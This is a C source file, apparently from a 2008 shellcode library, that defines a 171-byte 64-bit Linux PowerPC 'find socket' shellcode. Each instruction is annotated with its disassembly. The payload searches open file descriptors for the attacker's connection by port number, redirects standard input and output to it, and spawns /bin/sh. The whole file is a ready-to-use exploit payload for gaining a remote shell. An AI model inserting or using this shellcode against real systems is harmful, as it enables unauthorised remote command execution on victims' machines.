/*
 *  lin-power-fndsockcode64.c
 *  Copyright 2008 Ramon de Carvalho Valle <ramon@risesecurity.org>
 *
 *  This library is free software; you can redistribute it and/or
 *  modify it under the terms of the GNU Lesser General Public
 *  License as published by the Free Software Foundation; either
 *  version 2.1 of the License, or (at your option) any later version.
 *
 *  This library is distributed in the hope that it will be useful,
 *  but WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
 *  Lesser General Public License for more details.
 *
 *  You should have received a copy of the GNU Lesser General Public
 *  License along with this library; if not, write to the Free Software
 *  Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301  USA
 *
 */

#define FNDSOCKPORT 86

char fndsockcode64[]=       /*  171 bytes                         */
    "\x7f\xff\xfa\x78"      /*  xor     r31,r31,r31               */
    "\x3b\xa0\x01\xff"      /*  li      r29,511                   */
    "\x97\xe1\xff\xfc"      /*  stwu    r31,-4(r1)                */
    "\x7c\x3c\x0b\x78"      /*  mr      r28,r1                    */
    "\x3b\x7d\xfe\x11"      /*  addi    r27,r29,-495              */
    "\x97\x61\xff\xfc"      /*  stwu    r27,-4(r1)                */
    "\x7c\x3a\x0b\x78"      /*  mr      r26,r1                    */
    "\xfb\x41\xff\xf9"      /*  stdu    r26,-8(r1)                */
    "\xfb\x81\xff\xf9"      /*  stdu    r28,-8(r1)                */
    "\xfb\xe1\xff\xf9"      /*  stdu    r31,-8(r1)                */
    "\x3b\xff\x01\xff"      /*  addi    r31,r31,511               */
    "\x3b\xff\xfe\x02"      /*  addi    r31,r31,-510              */
    "\x38\x21\x01\xff"      /*  addi    r1,r1,511                 */
    "\x38\x21\xfe\x09"      /*  addi    r1,r1,-503                */
    "\xfb\xe1\xff\xf9"      /*  stdu    r31,-8(r1)                */
    "\x7c\x24\x0b\x78"      /*  mr      r4,r1                     */
    "\x38\x7d\xfe\x08"      /*  addi    r3,r29,-504               */
    "\x38\x1d\xfe\x67"      /*  addi    r0,r29,-409               */
    "\x44\xff\xff\x02"      /*  sc                                */
    "\x3b\x3c\x01\xff"      /*  addi    r25,r28,511               */
    "\xa3\x39\xfe\x03"      /*  lhz     r25,-509(r25)             */
    "\x28\x19\x04\xd2"      /*  cmplwi  r25,1234                  */
    "\x40\x82\xff\xd0"      /*  bne+    <fndsockcode64+40>        */
    "\x3b\x1d\xfe\x03"      /*  addi    r24,r29,-509              */
    "\x7f\x04\xc3\x78"      /*  mr      r4,r24                    */
    "\x7f\xe3\xfb\x78"      /*  mr      r3,r31                    */
    "\x38\x1d\xfe\x40"      /*  addi    r0,r29,-448               */
    "\x44\xff\xff\x02"      /*  sc                                */
    "\x37\x18\xff\xff"      /*  addic.  r24,r24,-1                */
    "\x40\x80\xff\xec"      /*  bge+    <fndsockcode64+96>        */
    "\x7c\xa5\x2a\x79"      /*  xor.    r5,r5,r5                  */
    "\x40\x82\xff\xfd"      /*  bnel+   <fndsockcode64+120>       */
    "\x7f\xc8\x02\xa6"      /*  mflr    r30                       */
    "\x3b\xde\x01\xff"      /*  addi    r30,r30,511               */
    "\x38\x7e\xfe\x25"      /*  addi    r3,r30,-475               */
    "\x98\xbe\xfe\x2c"      /*  stb     r5,-468(r30)              */
    "\xf8\xa1\xff\xf9"      /*  stdu    r5,-8(r1)                 */
    "\xf8\x61\xff\xf9"      /*  stdu    r3,-8(r1)                 */
    "\x7c\x24\x0b\x78"      /*  mr      r4,r1                     */
    "\x38\x1d\xfe\x0c"      /*  addi    r0,r29,-500               */
    "\x44\xff\xff\x02"      /*  sc                                */
    "/bin/sh"
;

